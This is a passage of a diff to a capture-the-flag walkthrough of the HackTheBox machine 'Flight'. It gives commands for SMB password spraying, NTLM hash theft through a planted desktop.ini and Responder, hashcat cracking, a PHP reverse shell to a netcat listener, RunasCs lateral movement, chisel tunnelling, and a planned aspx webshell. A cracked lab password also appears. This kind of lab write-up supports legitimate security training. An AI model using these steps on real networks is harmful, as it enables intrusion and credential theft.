@@ -119,8 +119,77 @@ http://school.flight.htb/index.php?view=//our-ip/attack
 
 hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt and we get the password.
 
-S@Ss!K@*t13
+
+Perform enum on SMB using the obtained credentials
+
+crackmapexec smb flight.htb -u svc_apache -p '*********' --users  and get a list of users
+we bruteforce the users with the above password to check if anyone is using the same password as svc_apache
+
+SMB    flight.htb      445    G0     [+] flight.htb\S.Moon:S*********3
+
+After research we find that we can use impacket for to search for a writable share
+https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d
+
+we use "impacket-psexec flight.htb/S.moon@flight.htb"
+
+Password:
+[*] Requesting shares on g0.flight.htb.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'NETLOGON' is not writable.
+[*] Found writable share Shared
+
+https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini
+[.ShellClassInfo]
+IconResource=\\<ip>\something
+
+After creating the file desktop.ini, we put it in the smb folder Shared:
+
+smbclient //flight.htb/shared -U S.moon
+Password for [WORKGROUP\S.moon]:
+Try "help" to get a list of possible commands.
+smb: \> put desktop.ini
+
+while also we open a Responder listener:
+Responder -I tun0 -wPv
 
 
+[SMB] NTLMv2-SSP Client   : 10.10.11.187
+[SMB] NTLMv2-SSP Username : flight.htb\c.bum
+[SMB] NTLMv2-SSP Hash     : c.bum::"hash"
 
+After that we use hashcat to crack c.bum password:
+
+hashcat -a 0 -m 5600 hash_c.bum /usr/share/wordlists/rockyou.txt --show
 Tikkycoll_431012284
+
+After get this cred, we can login into the Web folder with smb service.
+
+smbclient //flight.htb/Web -U c.bum
+
+then i can upload a reverse shell into th flight.htb share
+open a listener to our attacking machine nc -lvnp 9001
+
+access flight.htb/reverse_shell.php and get the reverse shell. 
+
+we need to go from svc_apache to c.bum user session
+
+https://github.com/antonioCoco/RunasCs/releases 
+
+RunasCs.exe c.bum Password powershell -r ip:port (to get a powershell session in another listener on our machine)
+
+nc -lvnp port
+
+and we get a session as c.bum user and the user.txt.
+netstat -a
+
+we see a port 8000 open so we use chisel to interact with it in our attacking machine.
+https://infinitelogins.com/2020/12/11/tunneling-through-windows-machines-with-chisel/
+
+#client
+.\chisel.exe client IP:9999 R:8000:127.0.0.1:8000
+
+#Server:
+chisel server --reverse -p 9999
+
+After accesing the website and playing with it we see from errors that the website is written in ASP.NET in which we can try to upload an .aspx webshell to get a session.
